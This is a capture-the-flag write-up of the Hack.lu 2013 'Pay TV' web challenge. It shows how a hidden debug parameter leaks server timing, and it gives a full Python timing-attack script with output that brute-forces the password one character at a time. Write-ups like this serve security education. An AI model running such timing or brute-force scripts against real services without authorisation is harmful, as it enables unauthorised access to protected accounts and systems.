Hack.lu CTF 2013: Challenge 4 "Pay TV" (web)
############################################

:date: 2013-10-24 10:00
:tags: ctf, hack.lu, writeup
:category: ctf
:slug: hacklu13-ctf-4-paytv

Who doesn't want to hack Pay TV? :) So do I. The challenge was a nice website with a tv on it that showed static and a form that requested a password.
A quick analysis of the JS revealed the following interesting line:

.. code-block:: javascript

    xhr.send('key=' + encodeURIComponent(key)/* + '&debug'*/)

The interesting part is the `&debug` parameter.

A

.. code-block:: bash

    lukas@Lukass-MacBook-Pro paytv  $ curl 'https://ctf.fluxfingers.net:1316/gimmetv' -H 'Content-Type: application/x-www-form-urlencoded' --data 'key=123456&debug'

gave me an interesting response of

.. code-block:: javascript

    {"start": 1382526729.725971, "end": 1382526729.726004, "response": "Wrong key.", "success": false}

As you can see, it returns the "computational time" of the algorithm. Hm? Timing attack? Yup. As it turns out, a (partially) correct code takes significantly longer than others. The obvious result was the following Python script:

.. code-block:: python

    import requests


    class KeyFound(Exception):
        pass


    def get_timing_for_key(key):
        data = {
                'key': key,
                'debug': ''
        }
        headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(
                'https://ctf.fluxfingers.net:1316/gimmetv',
                headers=headers,
                data=data,
                verify=False)
        j = r.json()
        if j.get('success'):
            raise KeyFound(key)
        start = j.get('start')
        end = j.get('end')
        t = end - start
        return t

    def find_key(chars=''):
        chars = chars + '%s'
        timings = {}
        for i in range(10):
            timings[chars % i] = get_timing_for_key(chars % i)
        for i in range(65, 91):
            timings[chars % chr(i)] = get_timing_for_key(chars % chr(i))
        for i in range(96, 123):
            timings[chars % chr(i)] = get_timing_for_key(chars % chr(i))

        timings = sorted(timings, key=timings.get, reverse=True)
        print 'Found partial key: %s' % timings[0]
        find_key(timings[0])


    if __name__ == '__main__':
        try:
            find_key()
        except KeyFound as key:
            print 'Found key: %s' % key

which yields

.. code-block:: bash

    (hackluctf13)lukas@Lukass-MacBook-Pro paytv  $ python paytv.py
    Found partial key: A
    Found partial key: AX
    Found partial key: AXM
    Found partial key: AXMN
    Found partial key: AXMNP
    Found partial key: AXMNP9
    Found key: AXMNP93

Type that code into the form and you get the flag on the tv :)
